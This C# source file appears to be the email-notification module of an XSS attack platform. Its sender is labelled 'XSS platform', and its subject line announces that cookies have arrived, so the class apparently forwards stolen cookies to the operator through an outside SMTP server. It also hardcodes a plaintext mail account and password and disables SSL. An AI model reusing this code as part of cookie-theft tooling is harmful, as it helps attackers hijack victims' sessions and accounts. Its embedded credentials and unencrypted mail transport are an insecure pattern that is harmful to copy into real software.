using System;
using System.Collections.Generic;
using System.Web;
using System.Net;
using System.Net.Mail;
using System.Text;
namespace xsstest
{
    public class mail
    {
        public void sendmail(string sender,string sendtourl, string content)
        {
            SmtpClient smtp = new SmtpClient();
            smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
            smtp.EnableSsl = false;
            smtp.Host = "smtp.sina.com";
            smtp.Port = 25;
            smtp.Credentials = new NetworkCredential("xsslabtest@sina.com", "xsslab123456");
            MailMessage mm = new MailMessage();
            mm.Priority = MailPriority.High;
            mm.From = new MailAddress("xsslabtest@sina.com", "xss平台", Encoding.GetEncoding(936));
            mm.ReplyTo = new MailAddress("xsslabtest@sina.com", "xss平台", Encoding.GetEncoding(936));
            mm.To.Add(new MailAddress(sendtourl, sender, Encoding.GetEncoding(936)));
            mm.Subject = "来cookie啦";
            mm.SubjectEncoding = Encoding.GetEncoding(936);
            mm.IsBodyHtml = true;
            mm.BodyEncoding = Encoding.GetEncoding(936);
            mm.Body = content;
            smtp.Send(mm);
        }
    }
}